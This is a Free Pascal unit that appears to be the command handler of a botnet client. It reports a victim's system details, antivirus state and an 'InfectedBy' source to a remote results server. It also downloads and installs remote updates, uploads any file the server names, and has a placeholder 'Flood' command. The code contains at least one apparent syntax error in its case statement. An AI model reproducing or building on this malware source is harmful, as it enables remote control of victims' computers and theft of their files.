unit CmdWorker;

{$mode objfpc}{$H+}

interface

uses
  NetModule, Tools,
  Classes, SysUtils, IdMultipartFormData, Process;

type
  TCmdWorker = class(TThread)
  private
    FCmdID: String;
    FIndex: LongInt;
  public
    property Identifier: String read FCmdID write FCmdID;
    constructor Create(CmdID: String; Index: LongInt);
    destructor Destroy; override;
    procedure Execute; override;
    procedure Abort(AbortID: String);
  end;

  TWorkers = Array of TCmdWorker;

var
  Workers: TWorkers;

function ExecIndex(CmdID: String): LongInt;
function FindAPlace: LongInt;

implementation

//Functions used by commands



//General functions and Command Execution

function FindAPlace: LongInt;
var
  J: LongInt;
  Found: Boolean;
Begin
  Found:=False;
  For J:=Low(Workers) to High(Workers) do
  if Not(Assigned(Workers[J])) then Begin
    Result:=J;
    Found:=True;
    Break;
  end;
  if Not(Found) then Begin
    J:=High(Workers) + 1;
    SetLength(Workers, J + 1);
    Result:=J;
  end;
end;

function ExecIndex(CmdID: String): LongInt;
var
  J: LongInt;
Begin
  Result:=-1;
  For J:=Low(Workers) to High(Workers) do
  if Assigned(Workers[J]) then
  if Workers[J].Identifier=CmdID then Begin
    Result:=J;
    Break;
  end;
end;

constructor TCmdWorker.Create(CmdID: String; Index: LongInt);
Begin
  inherited Create(True);
  FreeOnTerminate:=True;
  FCmdID:=CmdID;
  FIndex:=Index;
  Start;
end;

destructor TCmdWorker.Destroy;
Begin
  inherited Destroy;
  Workers[FIndex]:=Nil;
end;

procedure TCmdWorker.Abort(AbortID: String);
var
  ToPost: TIdMultipartFormDataStream;
Begin
  ToPost:=TIdMultipartFormDataStream.Create;
  ToPost.AddFormField('GUID', ID);
  ToPost.AddFormField('ID', AbortID);
  ToPost.AddFormField('RT', '1');
  ToPost.AddFormField('Result', 'Abort successful.');
  Writeln('APost --> ',Net.HTTPAgent.Post(Server+ResultsPHP, ToPost));
  ToPost.Free;
  Terminate;
end;

procedure TCmdWorker.Execute;
var
  ToPost: TIdMultipartFormDataStream;

  Master: TProcess;
  MemStream: TMemoryStream;
  Error: Boolean = False;

  procedure DoPost;
  Begin
     Writeln('Post --> ',Net.HTTPAgent.Post(Server+ResultsPHP, ToPost));
  end;

Begin
  ToPost:=TIdMultipartFormDataStream.Create;
  ToPost.AddFormField('GUID', ID);
  ToPost.AddFormField('ID', FCmdID);
  Writeln('Command type: ',Net.Commands.ReadString(FCmdID, 'Type', ''));
  Case Net.Commands.ReadString(FCmdID, 'Type', '') of
    'Register': Begin
      ToPost.AddFormField('RT', '3');

      AnalyzeSystem;
      ToPost.AddFormField('Nick', Nick);
      ToPost.AddFormField('OS', OS);
      ToPost.AddFormField('Comp', ComputerName);
      ToPost.AddFormField('User', UserName);
      ToPost.AddFormField('CPU', CPU);
      ToPost.AddFormField('GPU', GPU);
      ToPost.AddFormField('Anti', AVName);
      ToPost.AddFormField('Def', AVState);
      ToPost.AddFormField('Inf', Settings.ReadString('General', 'InfectedBy', 'Unknown'));
      DoPost;
    end;
    'Restart': Begin
      ToPost.AddFormField('RT', '1');
      ToPost.AddFormField('Result', 'Restarting.');
      DoPost;
      Restart(FullName);
    end;
    'Update': Begin
      ToPost.AddFormField('RT', '1');
      MemStream:=TMemoryStream.Create;
      try
        Net.DownloadFile(
            Net.Commands.ReadString(FCmdID, 'URL', ''),
            MemStream);
        RenameFile(FullName, FileName+'.old');
        MemStream.SaveToFile(FullName);
      except
        on E: Exception do Begin
          Error:=True;
          ToPost.AddFormField('Result', 'Update failed: '+E.Message);
          DoPost;
        end;
      end;
      MemStream.Free;
      if Not(Error) then Begin
        ToPost.AddFormField('Result', 'File downloaded, update in progress.');
        DoPost;
        Restart(FullName, True);
      end;
    end;
    'Uninstall': Begin

    end;
    'Flood': Begin
      ToPost.AddFormField('RT', '1');
      ToPost.AddFormField('Result', 'This is going to take a long time!');
      //DoPost;
      While Not(Terminated) do Begin
        //Doing some stuff
      end;
      ToPost.AddFormField('Result', 'All done!');
      DoPost;
    end;
    'Upload': Begin
      Writeln('It wants me to upload ',Net.Commands.ReadString(FCmdID, 'FileName', ''));
      ToPost.AddFormField('RT', '2');
      ToPost.AddFile('File', Net.Commands.ReadString(FCmdID, 'FileName', ''));
      DoPost;
    end;
    'Ping': Begin
      ToPost.AddFormField('RT', '1');
      ToPost.AddFormField('Result', 'Pong!');
      DoPost;
    end
    end
    else Begin
      ToPost.AddFormField('RT', '1');
      ToPost.AddFormField('Result', 'Unknown command!');
      DoPost;
    end;
  end;
  //Send result to the server
  ToPost.Free;
  Writeln('Thread ',FCmdID,' exited.');
end;

end.

